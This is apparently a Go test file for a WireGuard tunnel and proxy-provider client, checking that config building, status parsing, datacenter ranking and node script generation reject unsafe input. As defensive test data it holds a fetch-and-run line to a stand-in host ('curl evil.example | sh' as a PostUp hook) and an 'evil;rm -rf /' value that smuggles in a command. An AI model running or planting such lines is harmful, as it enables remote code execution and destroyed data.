package tsin

import (
	"context"
	"encoding/base64"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

var testKey = base64.StdEncoding.EncodeToString(make([]byte, 32))

func profile(extra, allowed string) RegisterResult {
	return RegisterResult{
		Status: "success", ServerWGIP: "10.0.0.1",
		WGConf: "[Interface]\nPrivateKey = " + testKey + "\nAddress = 10.0.0.10/24\n" + extra +
			"\n[Peer]\nPublicKey = " + testKey + "\nEndpoint = 217.179.6.41:51820\nAllowedIPs = " + allowed + "\nPersistentKeepalive = 25\n",
	}
}

func TestBuildConfigKeepsOnlyWhatATunnelNeeds(t *testing.T) {
	conf, err := BuildConfig(profile("PostUp = curl evil.example | sh\nSaveConfig = true\n", "10.0.0.1/32"))
	if err != nil {
		t.Fatal(err)
	}
	for _, banned := range []string{"PostUp", "evil", "SaveConfig"} {
		if strings.Contains(conf, banned) {
			t.Fatalf("%s survived into the profile:\n%s", banned, conf)
		}
	}
	for _, want := range []string{"Address = 10.0.0.10/32", "AllowedIPs = 10.0.0.1/32", "Endpoint = 217.179.6.41:51820"} {
		if !strings.Contains(conf, want) {
			t.Fatalf("missing %q:\n%s", want, conf)
		}
	}
	if ProxyAddress(conf) != "10.0.0.1" {
		t.Fatalf("proxy address = %q", ProxyAddress(conf))
	}
}

func TestBuildConfigRefusesToRouteTheWholeServer(t *testing.T) {
	for _, allowed := range []string{"0.0.0.0/0", "10.0.0.0/24", "0.0.0.0/0, ::/0", "8.8.8.8/32"} {
		if _, err := BuildConfig(profile("", allowed)); err == nil {
			t.Fatalf("AllowedIPs = %s was accepted", allowed)
		}
	}
	bad := profile("", "10.0.0.1/32")
	bad.WGConf = strings.Replace(bad.WGConf, testKey, "not-a-key", 1)
	if _, err := BuildConfig(bad); err == nil {
		t.Fatal("an invalid private key was accepted")
	}
	mismatch := profile("", "10.0.0.1/32")
	mismatch.ServerWGIP = "10.0.0.9"
	if _, err := BuildConfig(mismatch); err == nil {
		t.Fatal("a proxy address that disagrees with the profile was accepted")
	}
}

func TestStatusReadsCountriesAndResolvesNames(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/status" || r.URL.Query().Get("token") != "secret-token" {
			t.Errorf("unexpected request %s", r.URL.String())
		}
		_, _ = w.Write([]byte(`{"status":"success","client_name":"X","data_used_gb":1.5,"data_limit_gb":10.0,
"active_connections":2,"expiry_date":"2026-10-28 17:49:36","is_active":1,
"active_proxies":{"1082":{"country":"Germany","mode":"proxy","ping_ms":105},
"1095":{"country":"Turkey","mode":"proxy","ping_ms":"?"},"1080":{"country":"France dc","mode":"direct","ping_ms":"?"}}}`))
	}))
	defer server.Close()
	client := Client{HTTP: server.Client(), BaseURL: func(string) string { return server.URL }}

	status, err := client.Status(context.Background(), "dc1", "secret-token")
	if err != nil {
		t.Fatal(err)
	}
	if !status.Active || status.DataLimitGB != 10 || status.DataUsedGB != 1.5 || len(status.Proxies) != 3 {
		t.Fatalf("status = %#v", status)
	}
	found, missing := status.Resolve([]string{"germany", "Turkey", "Atlantis", "Germany"})
	if len(found) != 2 || found[0].Port != 1082 || found[1].Port != 1095 || len(missing) != 1 || missing[0] != "Atlantis" {
		t.Fatalf("found=%v missing=%v", found, missing)
	}
}

func TestErrorsNeverCarryTheToken(t *testing.T) {
	client := Client{BaseURL: func(string) string { return "http://127.0.0.1:1" }}
	_, err := client.Status(context.Background(), "dc1", "secret-token")
	if err == nil || strings.Contains(err.Error(), "secret-token") {
		t.Fatalf("error = %v", err)
	}
	if _, err := client.Status(context.Background(), "evil.example", "secret-token"); err == nil {
		t.Fatal("an arbitrary datacenter host was accepted")
	}
	if _, err := client.Status(context.Background(), "dc1", "bad token&x=1"); err == nil {
		t.Fatal("a malformed token was accepted")
	}
}

func TestTunnelWritesAPrivateProfileAndRestartsTheUnit(t *testing.T) {
	var calls []string
	tunnel := Tunnel{
		Dir:       filepath.Join(t.TempDir(), "wireguard"),
		Installed: func() bool { return true },
		Run: func(_ context.Context, name string, args ...string) ([]byte, error) {
			calls = append(calls, name+" "+strings.Join(args, " "))
			return nil, nil
		},
	}
	if err := tunnel.Up(context.Background(), "conf"); err != nil {
		t.Fatal(err)
	}
	info, err := os.Stat(filepath.Join(tunnel.Dir, "tsin0.conf"))
	if err != nil {
		t.Fatal(err)
	}
	if info.Mode().Perm()&0o077 != 0 && os.PathSeparator == '/' {
		t.Fatalf("profile is readable by others: %v", info.Mode())
	}
	joined := strings.Join(calls, "\n")
	for _, want := range []string{"wg-quick down tsin0", "systemctl enable wg-quick@tsin0", "systemctl restart wg-quick@tsin0"} {
		if !strings.Contains(joined, want) {
			t.Fatalf("missing %q in\n%s", want, joined)
		}
	}
	if err := tunnel.Down(context.Background()); err != nil || tunnel.ConfigExists() {
		t.Fatalf("down: err=%v exists=%v", err, tunnel.ConfigExists())
	}
}

func TestNodeScriptNeverCarriesTheTokenAndPinsTheDatacenter(t *testing.T) {
	script := NodeScript("dc3")
	if !strings.Contains(script, "DC=dc3") || strings.Contains(script, "@DC@") {
		t.Fatalf("datacenter not applied:\n%s", script)
	}
	if !strings.Contains(NodeScript("evil;rm -rf /"), "DC=dc1") {
		t.Fatal("an arbitrary datacenter reached the script")
	}
	// The token is typed on the node; the script must read it, not embed one.
	if !strings.Contains(script, "read -rs") || strings.Contains(script, "token=ey") {
		t.Fatal("the script does not ask for the token itself")
	}
	if !strings.HasPrefix(script, "sudo tee /tmp/tsin-node.sh") ||
		!strings.Contains(script, "\nTSIN_SCRIPT_END\nsudo bash /tmp/tsin-node.sh") {
		t.Fatalf("the script is not wrapped, so it would run inside the admin's own shell:\n%s", script[:120])
	}
	if strings.Contains(script, "`") {
		t.Fatal("a backtick would break the Go raw string and the shell quoting")
	}
}

func TestRefusalReasonIsReadFromTheErrorKey(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte(`{"error": "Token is currently in use on another online server. Stop it first to switch IPs."}`))
	}))
	defer server.Close()
	client := Client{HTTP: server.Client(), BaseURL: func(string) string { return server.URL }}

	_, err := client.Status(context.Background(), "dc1", "secret-token")
	if err == nil || !strings.Contains(err.Error(), "in use on another online server") {
		t.Fatalf("the provider's reason was lost: %v", err)
	}
	_, err = client.Register(context.Background(), "dc1", "secret-token")
	if err == nil || !strings.Contains(err.Error(), "in use on another online server") {
		t.Fatalf("the provider's reason was lost on register: %v", err)
	}
}

func TestRankDatacentersPutsWorkingFastOnesFirst(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		dc := strings.Split(strings.TrimPrefix(r.URL.Path, "/"), "/")[0]
		switch dc {
		case "dc1":
			w.WriteHeader(http.StatusServiceUnavailable)
			_, _ = w.Write([]byte(`{"error":"down"}`))
		case "dc2":
			time.Sleep(300 * time.Millisecond)
			_, _ = w.Write([]byte(`{"status":"success","active_proxies":{"5001":{"country":"Germany"}}}`))
		case "dc4":
			_, _ = w.Write([]byte(`{"status":"success","active_proxies":{"5001":{"country":"Germany"},"5002":{"country":"France dc"}}}`))
		default:
			_, _ = w.Write([]byte(`{"error":"Invalid token"}`))
		}
	}))
	defer server.Close()
	client := Client{HTTP: server.Client(), BaseURL: func(dc string) string { return server.URL + "/" + dc }}

	ranked := client.RankDatacenters(context.Background(), "token-123456")
	if len(ranked) != 5 || ranked[0].DC != "dc4" || ranked[1].DC != "dc2" || !ranked[0].OK || !ranked[1].OK {
		t.Fatalf("ranked = %+v", ranked)
	}
	for _, result := range ranked[2:] {
		if result.OK || result.Error == "" {
			t.Fatalf("%s should be refused with a reason: %+v", result.DC, result)
		}
	}
	want := ranked[1].Status.PortsOf([]string{"Germany"})
	if !ranked[0].Status.SamePorts(want) {
		t.Fatal("dc4 serves Germany on the same port")
	}
	if ranked[0].Status.SamePorts(map[string]int{"germany": 9999}) || ranked[0].Status.SamePorts(nil) {
		t.Fatal("other ports, or nothing to compare, must not count as the same")
	}
}

func TestNodeScriptInstallsTheWatch(t *testing.T) {
	script := NodeScript("dc2")
	for _, want := range []string{
		"printf '%s' \"$TOKEN\" > /etc/wireguard/tsin0.token",
		"umask 077",
		"/usr/local/lib/next-tsin/register.sh --fresh",
		"systemctl enable --now next-tsin-watch.timer",
		"OnUnitActiveSec=1min",
		"keeping the old one",
	} {
		if !strings.Contains(script, want) {
			t.Fatalf("node script lacks %q", want)
		}
	}
}

func TestStatusExpiryReadsTehranTime(t *testing.T) {
	naive := Status{ExpiryDate: "2026-12-01T10:00:00"}
	when, ok := naive.Expiry()
	if !ok || !when.Equal(time.Date(2026, 12, 1, 6, 30, 0, 0, time.UTC)) {
		t.Fatalf("naive expiry = %v %v", when, ok)
	}
	zoned := Status{ExpiryDate: "2026-12-01T10:00:00Z"}
	if when, ok := zoned.Expiry(); !ok || !when.Equal(time.Date(2026, 12, 1, 10, 0, 0, 0, time.UTC)) {
		t.Fatalf("zoned expiry = %v %v", when, ok)
	}
	if _, ok := (Status{}).Expiry(); ok {
		t.Fatal("no expiry must not parse")
	}
}
